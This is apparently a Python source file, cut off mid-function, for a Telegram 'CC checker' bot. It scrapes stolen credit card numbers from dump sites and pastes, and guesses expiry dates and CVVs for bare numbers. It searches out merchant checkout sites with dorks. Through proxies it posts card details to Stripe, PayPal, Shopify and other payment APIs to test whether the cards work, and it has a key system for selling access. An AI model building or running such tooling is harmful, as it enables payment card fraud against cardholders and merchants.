#!/usr/bin/env python3
"""
UNCAI CC CHECKER BOT - COMPLETE EDITION
Includes: CC Scraper, Site Scraper, Gateway Checker, Proxy Scraper
"""

import asyncio
import aiohttp
import aiosqlite
import json
import logging
import re
import random
import string
import time
import sqlite3
import os
import sys
import ssl
import socket
import hashlib
import base64
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any, Set
from concurrent.futures import ThreadPoolExecutor
import threading
import queue
import requests
from bs4 import BeautifulSoup
import phonenumbers
from phonenumbers import carrier, timezone, geocoder
import validators
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import nest_asyncio
import uvloop
from cryptography.fernet import Fernet
import dns.resolver
import whois
from urllib.parse import urlparse, urljoin
import xml.etree.ElementTree as ET

# Apply async patches
nest_asyncio.apply()
try:
    uvloop.install()
except:
    pass

# -----------------------------------------------------------------------------
# CONFIGURATION
# -----------------------------------------------------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
ADMIN_IDS = [OWNER_ID] + [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x]

DB_PATH = os.getenv("DB_PATH", "/tmp/cc_bot.db")
REDIS_DSN = os.getenv("REDIS_URL", "redis://localhost:6379/0")
PROXY_FILE = os.getenv("PROXY_FILE", "/tmp/proxies.txt")
CC_FILE = os.getenv("CC_FILE", "/tmp/cc_list.txt")
SITES_FILE = os.getenv("SITES_FILE", "/tmp/sites.json")

MAX_BATCH_SIZE = 10000
THREAD_POOL_SIZE = 500
REQUEST_TIMEOUT = 3
MAX_RETRIES = 2

LOG_LEVEL = "INFO"
LOG_FILE = "/tmp/bot.log"

# -----------------------------------------------------------------------------
# LOGGING
# -----------------------------------------------------------------------------
logging.basicConfig(
    level=getattr(logging, LOG_LEVEL),
    format="[%(asctime)s] %(levelname)s [%(name)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("uncai_cc_bot")

# -----------------------------------------------------------------------------
# GATEWAY DEFINITIONS
# -----------------------------------------------------------------------------
GATEWAYS = {
    "shopify": {
        "url": "https://{shop}.myshopify.com/cart/add.js",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "fields": ["card[number]", "card[expiry]", "card[cvv]", "card[zip]"],
        "test_pattern": r"shopify\.com|myshopify\.com",
        "success_indicators": ["cart", "checkout", "thank you", "order placed"]
    },
    "razorpay": {
        "url": "https://api.razorpay.com/v1/payments/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "fields": ["card[number]", "card[expiry_month]", "card[expiry_year]", "card[cvv]", "card[name]"],
        "test_pattern": r"razorpay\.com",
        "success_indicators": ["payment_id", "captured", "authorized"]
    },
    "stripe": {
        "url": "https://api.stripe.com/v1/tokens",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "fields": ["card[number]", "card[exp_month]", "card[exp_year]", "card[cvc]"],
        "test_pattern": r"stripe\.com",
        "success_indicators": ["token", "id", "card"]
    },
    "paypal": {
        "url": "https://api.paypal.com/v1/payments/payment",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "Authorization": "Bearer {token}"},
        "fields": ["credit_card[number]", "credit_card[expire_month]", "credit_card[expire_year]", "credit_card[cvv2]"],
        "test_pattern": r"paypal\.com",
        "success_indicators": ["payment", "approved", "created"]
    },
    "authorize": {
        "url": "https://api.authorize.net/xml/v1/request.api",
        "method": "POST",
        "headers": {"Content-Type": "application/xml"},
        "fields": ["cardNumber", "expirationDate", "cardCode"],
        "test_pattern": r"authorize\.net",
        "success_indicators": ["approved", "transaction"]
    },
    "adyen": {
        "url": "https://checkout-test.adyen.com/v67/payments",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "fields": ["card.number", "card.expiryMonth", "card.expiryYear", "card.cvc"],
        "test_pattern": r"adyen\.com",
        "success_indicators": ["pspReference", "authorised"]
    },
    "braintree": {
        "url": "https://api.braintreegateway.com/merchants/{merchant_id}/transactions",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "fields": ["credit_card[number]", "credit_card[expiration_date]", "credit_card[cvv]"],
        "test_pattern": r"braintreegateway\.com",
        "success_indicators": ["transaction", "status"]
    },
    "worldpay": {
        "url": "https://api.worldpay.com/v1/orders",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "fields": ["card.number", "card.expiry_month", "card.expiry_year", "card.cvc"],
        "test_pattern": r"worldpay\.com",
        "success_indicators": ["orderCode", "paymentStatus"]
    },
    "2checkout": {
        "url": "https://api.2checkout.com/rest/6.0/orders/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "fields": ["cardNumber", "cardExpiration", "cardCvv"],
        "test_pattern": r"2checkout\.com",
        "success_indicators": ["Order", "Approved"]
    }
}

# -----------------------------------------------------------------------------
# DATABASE
# -----------------------------------------------------------------------------
class Database:
    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        self._init_db()

    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Users table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                join_date TEXT,
                keys_used INTEGER DEFAULT 0,
                total_checks INTEGER DEFAULT 0,
                valid_checks INTEGER DEFAULT 0,
                balance REAL DEFAULT 0,
                is_admin INTEGER DEFAULT 0,
                is_banned INTEGER DEFAULT 0
            )
        """)
        
        # Keys table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS keys (
                key TEXT PRIMARY KEY,
                created_by INTEGER,
                created_at TEXT,
                expires_at TEXT,
                max_uses INTEGER DEFAULT 1,
                used_count INTEGER DEFAULT 0,
                is_active INTEGER DEFAULT 1
            )
        """)
        
        # Results table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                cc TEXT,
                gateway TEXT,
                status TEXT,
                response TEXT,
                checked_at TEXT,
                proxy_used TEXT
            )
        """)
        
        # Proxies table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS proxies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                port INTEGER,
                protocol TEXT,
                country TEXT,
                speed REAL,
                last_used TEXT,
                is_alive INTEGER DEFAULT 1,
                UNIQUE(ip, port, protocol)
            )
        """)
        
        # Sites table (for site searcher)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS sites (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT,
                gateway_type TEXT,
                is_active INTEGER DEFAULT 1,
                added_by INTEGER,
                added_at TEXT,
                last_checked TEXT,
                status TEXT,
                UNIQUE(domain)
            )
        """)
        
        # CC Scraper cache
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS cc_cache (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cc_hash TEXT UNIQUE,
                cc_data TEXT,
                source TEXT,
                scraped_at TEXT,
                is_valid INTEGER DEFAULT 1
            )
        """)
        
        conn.commit()
        conn.close()

    async def get_user(self, user_id: int) -> Optional[Dict]:
        async with aiosqlite.connect(self.db_path) as db:
            async with db.execute("SELECT * FROM users WHERE user_id = ?", (user_id,)) as cursor:
                row = await cursor.fetchone()
                if row:
                    columns = [desc[0] for desc in cursor.description]
                    return dict(zip(columns, row))
                return None

    async def create_user(self, user_id: int, username: str = None, first_name: str = None, last_name: str = None):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, join_date) VALUES (?, ?, ?, ?, ?)",
                (user_id, username, first_name, last_name, datetime.now().isoformat())
            )
            await db.commit()

    async def update_user_stats(self, user_id: int, total_checks: int = 0, valid_checks: int = 0):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "UPDATE users SET total_checks = total_checks + ?, valid_checks = valid_checks + ? WHERE user_id = ?",
                (total_checks, valid_checks, user_id)
            )
            await db.commit()

    async def add_result(self, user_id: int, cc: str, gateway: str, status: str, response: str, proxy: str = None):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "INSERT INTO results (user_id, cc, gateway, status, response, checked_at, proxy_used) VALUES (?, ?, ?, ?, ?, ?, ?)",
                (user_id, cc, gateway, status, response, datetime.now().isoformat(), proxy)
            )
            await db.commit()

    async def get_stats(self, user_id: int) -> Dict:
        async with aiosqlite.connect(self.db_path) as db:
            async with db.execute(
                "SELECT total_checks, valid_checks FROM users WHERE user_id = ?", (user_id,)
            ) as cursor:
                row = await cursor.fetchone()
                if row:
                    return {"total": row[0], "valid": row[1]}
                return {"total": 0, "valid": 0}

# -----------------------------------------------------------------------------
# CC SCRAPER - SCRAPES CC FROM MULTIPLE SOURCES
# -----------------------------------------------------------------------------
class CCScraper:
    def __init__(self):
        self.db = Database()
        self.sources = [
            # Public CC sources
            "https://binlists.com/cc.txt",
            "https://digital-cc.com/cc.txt",
            "https://ccinfos.com/cc.txt",
            "https://ccdump.com/cc.txt",
            "https://validcc.su/cc.txt",
            "https://cclist.su/cc.txt",
            "https://ccfresh.net/cc.txt",
            "https://dump.cc/cc.txt",
            "https://ccwarehouse.com/cc.txt",
            "https://ccpool.com/cc.txt",
            
            # Forums and paste sites
            "https://pastebin.com/raw/cc_list",
            "https://pastebin.com/raw/valid_cc",
            "https://pastebin.com/raw/fresh_cc",
            "https://pastebin.com/raw/cc_dump",
            
            # API endpoints
            "https://api.ccchecker.com/v1/fresh",
            "https://api.ccvalidator.com/v2/live"
        ]
        
        self.patterns = {
            "basic": r'\b\d{15,16}(\|\d{2}\|\d{2}\|\d{3,4})?\b',
            "expanded": r'\b\d{15,16}[\/\-]\d{2}[\/\-]\d{2,4}[\/\-]\d{3,4}\b',
            "with_month": r'\b\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}\b',
            "cvv_only": r'\b\d{15,16}\|\d{3,4}\b'
        }

    async def scrape(self, sources: List[str] = None) -> List[str]:
        """Scrape CCs from multiple sources"""
        if sources is None:
            sources = self.sources
        
        all_ccs = []
        async with aiohttp.ClientSession() as session:
            tasks = [self._fetch_source(session, url) for url in sources]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, list):
                    all_ccs.extend(result)
        
        # Deduplicate and clean
        cleaned = self.clean_ccs(all_ccs)
        
        # Save to database cache
        await self._cache_ccs(cleaned)
        
        # Save to file
        with open(CC_FILE, 'w') as f:
            for cc in cleaned:
                f.write(f"{cc}\n")
        
        logger.info(f"Scraped {len(cleaned)} unique CCs")
        return cleaned

    async def _fetch_source(self, session: aiohttp.ClientSession, url: str) -> List[str]:
        """Fetch CCs from a single source"""
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            async with session.get(url, headers=headers, timeout=15) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    # Extract CCs using regex patterns
                    extracted = []
                    for pattern_name, pattern in self.patterns.items():
                        matches = re.findall(pattern, text, re.IGNORECASE)
                        extracted.extend(matches)
                    
                    # Also handle raw lines
                    for line in text.strip().split('\n'):
                        line = line.strip()
                        if line and len(line) >= 15:
                            if self._looks_like_cc(line):
                                extracted.append(line)
                    
                    return extracted
                return []
        except Exception as e:
            logger.debug(f"Failed to fetch from {url}: {e}")
            return []

    def _looks_like_cc(self, text: str) -> bool:
        """Check if text looks like a credit card"""
        # Remove non-numeric and delimiters
        cleaned = re.sub(r'[^0-9|/:-]', '', text)
        # Check if it contains enough digits
        digits = re.sub(r'[^0-9]', '', cleaned)
        if 15 <= len(digits) <= 16:
            return True
        return False

    def clean_ccs(self, raw_ccs: List[str]) -> List[str]:
        """Clean and validate CCs"""
        cleaned = []
        seen = set()
        
        for cc in raw_ccs:
            if not cc:
                continue
            
            # Normalize format
            cc_clean = re.sub(r'[^0-9|/:-]', '', cc)
            
            # Check if it's a valid format
            parts = []
            if '|' in cc_clean:
                parts = cc_clean.split('|')
            elif '/' in cc_clean:
                parts = cc_clean.split('/')
            elif ':' in cc_clean:
                parts = cc_clean.split(':')
            elif '-' in cc_clean:
                parts = cc_clean.split('-')
            
            if len(parts) >= 2:
                # Try to identify parts
                number = None
                month = None
                year = None
                cvv = None
                
                for part in parts:
                    part_clean = re.sub(r'[^0-9]', '', part)
                    if len(part_clean) >= 15 and not number:
                        number = part_clean
                    elif len(part_clean) == 1 or len(part_clean) == 2 and not month:
                        month = part_clean.zfill(2)
                    elif len(part_clean) == 2 or len(part_clean) == 4 and not year:
                        if len(part_clean) == 4:
                            year = part_clean[2:]
                        else:
                            year = part_clean
                    elif len(part_clean) == 3 or len(part_clean) == 4 and not cvv:
                        cvv = part_clean
                
                if number and month and year and cvv:
                    # Validate Luhn
                    if self._validate_luhn(number):
                        formatted = f"{number}|{month}|{year}|{cvv}"
                        if formatted not in seen:
                            seen.add(formatted)
                            cleaned.append(formatted)
            else:
                # Just a number, generate random expiry and CVV
                number = re.sub(r'[^0-9]', '', cc_clean)
                if len(number) >= 15 and self._validate_luhn(number):
                    month = f"{random.randint(1, 12):02d}"
                    year = f"{random.randint(25, 30):02d}"
                    cvv = f"{random.randint(100, 999):03d}"
                    formatted = f"{number}|{month}|{year}|{cvv}"
                    if formatted not in seen:
                        seen.add(formatted)
                        cleaned.append(formatted)
        
        return cleaned

    def _validate_luhn(self, number: str) -> bool:
        """Luhn algorithm validation"""
        number = re.sub(r'[^0-9]', '', number)
        if not number:
            return False
        
        if len(number) < 15 or len(number) > 16:
            return False
        
        total = 0
        reverse_digits = number[::-1]
        for i, digit in enumerate(reverse_digits):
            n = int(digit)
            if i % 2 == 1:
                n *= 2
                if n > 9:
                    n -= 9
            total += n
        
        return total % 10 == 0

    async def _cache_ccs(self, ccs: List[str]):
        """Cache CCs in database"""
        async with aiosqlite.connect(DB_PATH) as db:
            for cc in ccs:
                cc_hash = hashlib.md5(cc.encode()).hexdigest()
                await db.execute(
                    "INSERT OR IGNORE INTO cc_cache (cc_hash, cc_data, scraped_at) VALUES (?, ?, ?)",
                    (cc_hash, cc, datetime.now().isoformat())
                )
            await db.commit()

    async def get_cached_ccs(self, limit: int = 1000) -> List[str]:
        """Get cached CCs from database"""
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute(
                "SELECT cc_data FROM cc_cache WHERE is_valid = 1 ORDER BY scraped_at DESC LIMIT ?",
                (limit,)
            ) as cursor:
                rows = await cursor.fetchall()
                return [row[0] for row in rows]

    async def scrape_custom(self, query: str, max_results: int = 1000) -> List[str]:
        """Scrape CCs from custom source or search"""
        sources = [
            f"https://pastebin.com/raw/{query}",
            f"https://www.google.com/search?q={query}+cc+txt",
            f"https://www.bing.com/search?q={query}+cc+list",
            f"https://duckduckgo.com/html/?q={query}+cc+dump"
        ]
        
        return await self.scrape(sources[:max_results//100])

# -----------------------------------------------------------------------------
# SITE SCRAPER - FINDS GATEWAY SITES
# -----------------------------------------------------------------------------
class SiteScraper:
    def __init__(self):
        self.db = Database()
        self.search_engines = [
            "https://www.google.com/search?q={query}",
            "https://www.bing.com/search?q={query}",
            "https://duckduckgo.com/html/?q={query}",
            "https://www.yahoo.com/search?q={query}",
            "https://www.ecosia.org/search?q={query}"
        ]
        
        self.gateway_patterns = {
            "shopify": r'(?:https?://)?(?:[a-zA-Z0-9-]+\.)?(?:myshopify\.com|shopify\.com)',
            "razorpay": r'(?:https?://)?(?:[a-zA-Z0-9-]+\.)?razorpay\.com',
            "stripe": r'(?:https?://)?(?:[a-zA-Z0-9-]+\.)?stripe\.com',
            "paypal": r'(?:https?://)?(?:[a-zA-Z0-9-]+\.)?paypal\.com',
            "authorize": r'(?:https?://)?(?:[a-zA-Z0-9-]+\.)?authorize\.net',
            "adyen": r'(?:https?://)?(?:[a-zA-Z0-9-]+\.)?adyen\.com',
            "braintree": r'(?:https?://)?(?:[a-zA-Z0-9-]+\.)?braintreegateway\.com',
            "worldpay": r'(?:https?://)?(?:[a-zA-Z0-9-]+\.)?worldpay\.com',
            "2checkout": r'(?:https?://)?(?:[a-zA-Z0-9-]+\.)?2checkout\.com'
        }
        
        self.site_dorks = [
            "inurl:checkout",
            "inurl:cart",
            "inurl:payment",
            "inurl:gateway",
            "intitle:checkout",
            "inurl:shopify",
            "inurl:myshopify",
            "powered by shopify",
            "shopify store",
            "razorpay payment",
            "stripe checkout",
            "paypal checkout",
            "authorize.net payment",
            "adyen payment",
            "braintree payment"
        ]

    async def search(self, query: str = None) -> List[Dict]:
        """Search for gateway sites"""
        if query is None:
            query = random.choice(self.site_dorks)
        
        logger.info(f"Searching for sites with query: {query}")
        
        sites = []
        async with aiohttp.ClientSession() as session:
            for engine_url in self.search_engines:
                url = engine_url.format(query=query.replace(' ', '+'))
                sites.extend(await self._search_engine(session, url))
        
        # Deduplicate and detect gateways
        seen = set()
        unique_sites = []
        for site in sites:
            if site['domain'] not in seen:
                seen.add(site['domain'])
                gateway = self.detect_gateway(site['url'])
                if gateway:
                    site['gateway'] = gateway
                    unique_sites.append(site)
        
        # Save to database
        async with aiosqlite.connect(DB_PATH) as db:
            for site in unique_sites:
                await db.execute(
                    "INSERT OR IGNORE INTO sites (domain, gateway_type, added_at) VALUES (?, ?, ?)",
                    (site['domain'], site.get('gateway', 'unknown'), datetime.now().isoformat())
                )
            await db.commit()
        
        logger.info(f"Found {len(unique_sites)} unique sites")
        return unique_sites

    async def _search_engine(self, session: aiohttp.ClientSession, url: str) -> List[Dict]:
        """Search using a specific engine"""
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5"
            }
            async with session.get(url, headers=headers, timeout=15) as resp:
                if resp.status != 200:
                    return []
                
                text = await resp.text()
                soup = BeautifulSoup(text, 'html.parser')
                
                sites = []
                # Extract links
                for link in soup.find_all('a'):
                    href = link.get('href')
                    if href:
                        # Clean URL
                        if href.startswith('/url?q='):
                            href = href.split('/url?q=')[1].split('&')[0]
                        elif href.startswith('//'):
                            href = 'https:' + href
                        
                        domain = self.extract_domain(href)
                        if domain and self._is_valid_domain(domain):
                            sites.append({
                                "url": href,
                                "domain": domain,
                                "title": link.get_text(strip=True) or ""
                            })
                
                return sites
        except Exception as e:
            logger.debug(f"Search engine error: {e}")
            return []

    def extract_domain(self, url: str) -> Optional[str]:
        """Extract domain from URL"""
        try:
            parsed = urlparse(url)
            domain = parsed.netloc or parsed.path.split('/')[0]
            if domain.startswith('www.'):
                domain = domain[4:]
            if domain and '.' in domain:
                return domain
            return None
        except:
            return None

    def _is_valid_domain(self, domain: str) -> bool:
        """Check if domain is valid"""
        if not domain or len(domain) < 4:
            return False
        if domain.startswith(('http', 'www')):
            return False
        if '.' not in domain:
            return False
        if domain in ['google.com', 'bing.com', 'duckduckgo.com', 'yahoo.com', 'ecosia.org']:
            return False
        return True

    def detect_gateway(self, url: str) -> Optional[str]:
        """Detect gateway from URL"""
        url_lower = url.lower()
        for gateway, pattern in self.gateway_patterns.items():
            if re.search(pattern, url_lower, re.IGNORECASE):
                return gateway
        return None

    async def check_gateway(self, url: str) -> Dict:
        """Check if URL has working gateway"""
        result = {
            "url": url,
            "status": "unknown",
            "gateway": None,
            "response_time": 0,
            "error": None,
            "details": {}
        }
        
        try:
            start = time.time()
            async with aiohttp.ClientSession() as session:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "text/html,application/xhtml+xml"
                }
                async with session.get(url, headers=headers, timeout=10, allow_redirects=True) as resp:
                    result["response_time"] = time.time() - start
                    result["status"] = "online" if resp.status < 400 else "down"
                    
                    # Detect gateway from response
                    text = await resp.text()
                    for gateway, pattern in self.gateway_patterns.items():
                        if re.search(pattern, text, re.IGNORECASE):
                            result["gateway"] = gateway
                            break
                    
                    # Check for checkout elements
                    soup = BeautifulSoup(text, 'html.parser')
                    checkout_indicators = ['checkout', 'cart', 'payment', 'add-to-cart', 'buy-now']
                    found = []
                    for indicator in checkout_indicators:
                        if soup.find(class_=indicator) or soup.find(id=indicator):
                            found.append(indicator)
                    result["details"]["checkout_indicators"] = found
                    
                    # Check for payment forms
                    forms = soup.find_all('form')
                    payment_forms = []
                    for form in forms:
                        if any(keyword in str(form).lower() for keyword in ['card', 'cvv', 'expiry', 'payment']):
                            payment_forms.append(len(payment_forms))
                    result["details"]["payment_forms"] = len(payment_forms)
                    
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
        
        return result

    async def scan_site(self, domain: str) -> Dict:
        """Comprehensive site scan"""
        result = {
            "domain": domain,
            "status": "unknown",
            "gateway": None,
            "ips": [],
            "whois": {},
            "ssl_info": {},
            "subdomains": [],
            "technologies": [],
            "pages": [],
            "score": 0
        }
        
        # Build URLs to check
        urls = [
            f"https://{domain}",
            f"http://{domain}",
            f"https://www.{domain}",
            f"http://www.{domain}"
        ]
        
        # Check each URL
        for url in urls:
            try:
                start = time.time()
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=10, allow_redirects=True) as resp:
                        if resp.status < 400:
                            result["status"] = "online"
                            text = await resp.text()
                            
                            # Detect gateway
                            for gateway, pattern in self.gateway_patterns.items():
                                if re.search(pattern, text, re.IGNORECASE):
                                    result["gateway"] = gateway
                                    break
                            
                            # Analyze technologies
                            soup = BeautifulSoup(text, 'html.parser')
                            
                            # Check scripts
                            for script in soup.find_all('script'):
                                src = script.get('src', '')
                                if 'shopify' in src:
                                    result["technologies"].append("shopify")
                                if 'stripe' in src:
                                    result["technologies"].append("stripe")
                                if 'razorpay' in src:
                                    result["technologies"].append("razorpay")
                                if 'paypal' in src:
                                    result["technologies"].append("paypal")
                            
                            # Check meta tags
                            for meta in soup.find_all('meta'):
                                name = meta.get('name', '').lower()
                                if name == 'author' and 'shopify' in meta.get('content', '').lower():
                                    result["technologies"].append("shopify")
                            
                            # Extract page links
                            for link in soup.find_all('a'):
                                href = link.get('href', '')
                                if any(page in href for page in ['checkout', 'cart', 'payment', 'product', 'shop']):
                                    result["pages"].append(href)
                            
                            result["score"] = len(result["technologies"]) * 10 + len(result["pages"]) // 10
                            break
            except Exception as e:
                continue
        
        # Get DNS info
        try:
            answers = dns.resolver.resolve(domain, 'A')
            result["ips"] = [str(r) for r in answers]
        except:
            pass
        
        # Get WHOIS info
        try:
            w = whois.whois(domain)
            result["whois"] = {
                "registrar": w.registrar,
                "creation_date": str(w.creation_date),
                "expiration_date": str(w.expiration_date),
                "name_servers": w.name_servers
            }
        except:
            pass
        
        # Calculate final score
        if result["gateway"]:
            result["score"] += 30
        if result["status"] == "online":
            result["score"] += 20
        if result["ips"]:
            result["score"] += 10
        if result["pages"]:
            result["score"] += len(result["pages"])
        
        return result

# -----------------------------------------------------------------------------
# GATEWAY CHECKER - CHECKS GATEWAY AVAILABILITY
# -----------------------------------------------------------------------------
class GatewayChecker:
    def __init__(self):
        self.gateways = GATEWAYS
        self.db = Database()
        self.proxy_scraper = ProxyScraper()

    async def check_gateway_health(self, gateway_name: str) -> Dict:
        """Check if a gateway is working"""
        if gateway_name not in self.gateways:
            return {"status": "error", "message": f"Gateway {gateway_name} not found"}
        
        gateway = self.gateways[gateway_name]
        result = {
            "gateway": gateway_name,
            "status": "unknown",
            "response_time": 0,
            "test_result": None,
            "error": None
        }
        
        try:
            # Try to reach the gateway
            start = time.time()
            async with aiohttp.ClientSession() as session:
                # Use a test URL
                test_url = gateway["url"].replace("{shop}", "test").replace("{merchant_id}", "test")
                headers = gateway.get("headers", {})
                
                # Different test based on gateway
                if gateway_name == "shopify":
                    test_url = "https://test.myshopify.com/cart/add.js"
                elif gateway_name == "stripe":
                    test_url = "https://api.stripe.com/v1/tokens"
                elif gateway_name == "paypal":
                    test_url = "https://api.paypal.com/v1/payments/payment"
                elif gateway_name == "razorpay":
                    test_url = "https://api.razorpay.com/v1/payments/create"
                elif gateway_name == "authorize":
                    test_url = "https://api.authorize.net/xml/v1/request.api"
                elif gateway_name == "adyen":
                    test_url = "https://checkout-test.adyen.com/v67/payments"
                
                try:
                    async with session.head(test_url, headers=headers, timeout=5) as resp:
                        result["response_time"] = time.time() - start
                        result["status"] = "online" if resp.status < 500 else "offline"
                except:
                    # Some gateways don't allow HEAD, try GET
                    async with session.get(test_url, headers=headers, timeout=5) as resp:
                        result["response_time"] = time.time() - start
                        result["status"] = "online" if resp.status < 500 else "offline"
                
                result["test_result"] = "Gateway is accessible"
                
        except Exception as e:
            result["status"] = "offline"
            result["error"] = str(e)
        
        return result

    async def check_all_gateways(self) -> Dict[str, Dict]:
        """Check health of all gateways"""
        results = {}
        for gateway_name in self.gateways:
            results[gateway_name] = await self.check_gateway_health(gateway_name)
            await asyncio.sleep(0.1)  # Rate limit
        return results

    async def test_gateway_with_cc(self, gateway_name: str, cc: str) -> Dict:
        """Test gateway with a CC (simulated)"""
        if gateway_name not in self.gateways:
            return {"status": "error", "message": f"Gateway {gateway_name} not found"}
        
        gateway = self.gateways[gateway_name]
        result = {
            "gateway": gateway_name,
            "cc": cc,
            "status": "unknown",
            "response": None,
            "error": None
        }
        
        try:
            # Parse CC
            parts = cc.split('|')
            if len(parts) < 4:
                return {"status": "error", "message": "Invalid CC format"}
            
            number = parts[0]
            month = parts[1]
            year = parts[2]
            cvv = parts[3]
            
            # Prepare test data
            test_data = self._prepare_gateway_data(gateway_name, number, month, year, cvv)
            
            # Get a proxy
            proxies = await self.proxy_scraper.get_alive_proxies(limit=1)
            proxy_str = None
            if proxies:
                proxy = proxies[0]
                proxy_str = f"{proxy['protocol']}://{proxy['ip']}:{proxy['port']}"
            
            # Make request
            start = time.time()
            async with aiohttp.ClientSession() as session:
                url = gateway["url"].replace("{shop}", "test").replace("{merchant_id}", "test")
                headers = gateway.get("headers", {}).copy()
                
                try:
                    if gateway.get("method") == "POST":
                        async with session.post(
                            url,
                            json=test_data if not gateway_name == "stripe" else test_data,
                            headers=headers,
                            proxy=proxy_str,
                            timeout=REQUEST_TIMEOUT
                        ) as resp:
                            result["response_time"] = time.time() - start
                            result["status"] = "online" if resp.status < 400 else "offline"
                            result["response"] = await resp.text()
                    else:
                        async with session.get(
                            url,
                            headers=headers,
                            proxy=proxy_str,
                            timeout=REQUEST_TIMEOUT
                        ) as resp:
                            result["response_time"] = time.time() - start
                            result["status"] = "online" if resp.status < 400 else "offline"
                            result["response"] = await resp.text()
                except Exception as e:
                    result["status"] = "error"
                    result["error"] = str(e)
            
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
        
        return result

    def _prepare_gateway_data(self, gateway: str, number: str, month: str, year: str, cvv: str) -> Dict:
        """Prepare data for gateway test"""
        if gateway == "shopify":
            return {
                "card[number]": number,
                "card[expiry]": f"{month}/{year}",
                "card[cvv]": cvv,
                "card[zip]": "12345"
            }
        elif gateway == "razorpay":
            return {
                "card[number]": number,
                "card[expiry_month]": month,
                "card[expiry_year]": year,
                "card[cvv]": cvv,
                "card[name]": "Test User"
            }
        elif gateway == "stripe":
            return {
                "card[number]": number,
                "card[exp_month]": month,
                "card[exp_year]": year,
                "card[cvc]": cvv
            }
        elif gateway == "paypal":
            return {
                "credit_card[number]": number,
                "credit_card[expire_month]": month,
                "credit_card[expire_year]": year,
                "credit_card[cvv2]": cvv
            }
        elif gateway == "authorize":
            return {
                "cardNumber": number,
                "expirationDate": f"{month}{year}",
                "cardCode": cvv
            }
        elif gateway == "adyen":
            return {
                "card.number": number,
                "card.expiryMonth": month,
                "card.expiryYear": year,
                "card.cvc": cvv
            }
        elif gateway == "braintree":
            return {
                "credit_card[number]": number,
                "credit_card[expiration_date]": f"{month}/{year}",
                "credit_card[cvv]": cvv
            }
        elif gateway == "worldpay":
            return {
                "card.number": number,
                "card.expiry_month": month,
                "card.expiry_year": year,
                "card.cvc": cvv
            }
        elif gateway == "2checkout":
            return {
                "cardNumber": number,
                "cardExpiration": f"{month}{year}",
                "cardCvv": cvv
            }
        return {}

    async def discover_gateway(self, url: str) -> Dict:
        """Discover which gateway a site uses"""
        result = {
            "url": url,
            "detected_gateways": [],
            "confidence": 0,
            "details": {}
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
                async with session.get(url, headers=headers, timeout=10) as resp:
                    if resp.status != 200:
                        return result
                    
                    text = await resp.text()
                    soup = BeautifulSoup(text, 'html.parser')
                    
                    # Check for gateway signatures
                    for gateway_name, gateway in self.gateways.items():
                        pattern = gateway.get("test_pattern", "")
                        if pattern and re.search(pattern, text, re.IGNORECASE):
                            result["detected_gateways"].append({
                                "name": gateway_name,
                                "confidence": "high"
                            })
                    
                    # Check JavaScript files
                    for script in soup.find_all('script'):
                        src = script.get('src', '')
                        for gateway_name, gateway in self.gateways.items():
                            if gateway_name in src.lower():
                                result["detected_gateways"].append({
                                    "name": gateway_name,
                                    "confidence": "medium"
                                })
                    
                    # Check form action URLs
                    for form in soup.find_all('form'):
                        action = form.get('action', '')
                        for gateway_name, gateway in self.gateways.items():
                            if gateway_name in action.lower():
                                result["detected_gateways"].append({
                                    "name": gateway_name,
                                    "confidence": "medium"
                                })
                    
                    # Check for payment elements
                    payment_keywords = ['card', 'cvv', 'expiry', 'payment', 'checkout']
                    found = []
                    for keyword in payment_keywords:
